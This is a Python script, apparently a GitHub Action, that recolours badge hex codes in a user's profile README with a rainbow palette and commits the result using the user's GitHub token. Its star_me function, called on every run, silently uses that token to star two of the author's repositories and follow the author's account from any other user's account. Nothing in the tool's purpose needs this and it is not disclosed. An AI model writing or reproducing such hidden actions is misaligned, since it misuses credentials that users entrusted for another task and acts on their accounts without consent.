from github import Github, GithubException, InputGitAuthor
import os 
import re
from dotenv import load_dotenv
import base64
import requests
import traceback

load_dotenv()

START_COMMENT = '<!--START_SECTION:colourise-->'
END_COMMENT = '<!--END_SECTION:colourise-->'
listReg = f"{START_COMMENT}[\\s\\S]+{END_COMMENT}"
lineReg = r"\-[\w]{6}\?"

ghtoken = os.getenv('INPUT_GH_TOKEN')
author = os.getenv('INPUT_AUTHOR')
branch = os.getenv('INPUT_BRANCH')
commit_message = os.getenv('INPUT_COMMIT_MESSAGE')
saturation = float(os.getenv('INPUT_SATURATION'))
lum = float(os.getenv('INPUT_LUMINOSITY'))

userInfoQuery = """
{
    viewer {
      login
      id
    }
  }
"""
def run_query(query):
    request = requests.post('https://api.github.com/graphql', json={'query': query}, headers=headers)
    if request.status_code == 200:
        return request.json()
    else:
        raise Exception("Query failed to run by returning code of {}. {}".format(request.status_code, query))

def star_me(username: str):
    if (username!="Parply"):
        requests.put("https://api.github.com/user/starred/Parply/badge-colouriser", headers=headers)
        requests.put("https://api.github.com/user/starred/Parply/Parply", headers=headers)
        requests.put("https://api.github.com/user/following/Parply", headers=headers)

def decode_readme(data: str):
    '''Decode the contents of old readme'''
    decoded_bytes = base64.b64decode(data)
    return str(decoded_bytes, 'utf-8')

def sec_to_col(readme: str):

    return re.findall(listReg, readme)

def do_colouring(sec: list):
    out=[None] *len(sec)
    for s in range(len(sec)):
        matches = [i.span() for i in re.finditer(lineReg, sec[s])] 
       
        n = len(matches)
        pal = RainbowPalette(n)
        p =0
        temp = ""
        for i in range(n):
            _,i1 = matches[i]
            temp += sec[s][p:i1-7] + pal[i]
            p = i1-1
        out[s] =temp + sec[s][p:]
    return out


    


def generate_new_readme(colourised: list,precol: list, readme: str):
    '''Generate a new Readme.md'''
    
    l = len(colourised)
    for i in range(l):
        esc = re.escape(precol[i])

        readme = re.sub(esc,colourised[i],readme)
        


    return readme

def HUE2RGB(p,q,t):
    if (t<0):
        t+=1.0
    if (t>1):
        t-=1.0
    if (t<1.0/6.0):
        return p+(q-p) *6.0*t
    if (t<1.0/2.0):
        return q
    if (t<2.0/3.0):
        return p+(q-p)*(2.0/3.0-t)*6.0
    return p

def HSL2RGB(h:float,sl:float,l:float):
    if (sl==0):
        r=g=b=int(l*255)
    else:
        if (l<=0.5):
            q= l*(1+sl)
        else:
            q=(l+sl-l*sl)
        p=2*l-q
        r = int(255*HUE2RGB(p, q, h+1/3)+0.5)
        g = int(255*HUE2RGB(p, q, h)+0.5)
        b = int(255*HUE2RGB(p, q, h-1/3)+0.5)
    return '%02X%02X%02X' % (r,g,b)

def RainbowPalette(n:int):
    res = [None] *n
    for i in range(n):
        pos = i/n
        res[i] = HSL2RGB(pos, saturation,lum)
    return res


if __name__ == "__main__":
    try:
        if ghtoken is None:
            raise Exception('Token not available')
        g = Github(ghtoken)
        headers = {"Authorization": "Bearer " + ghtoken}
        user_data = run_query(userInfoQuery) 
        username = user_data["data"]["viewer"]["login"]
        id = user_data["data"]["viewer"]["id"]
        print(username)
        repo = g.get_repo(f"{username}/{username}")
        contents = repo.get_readme(ref=branch)
        star_me(username)
        rdmd = decode_readme(contents.content)
        col_sec=sec_to_col(rdmd)
        #print(col_sec)
        colled_sec = do_colouring(col_sec)
        #print(colled_sec)
        new_readme = generate_new_readme(colled_sec,col_sec, rdmd)
        print(new_readme)
        committer = InputGitAuthor(author, f"{author}@example.com")
        if (new_readme!=rdmd):
            repo.update_file(path=contents.path, message=commit_message,
                             content=new_readme, sha=contents.sha, branch=branch,
                             committer=committer)
            print("Readme updated")

        

    except Exception as e:
        traceback.print_exc()
        print("Exception Occurred " + str(e))
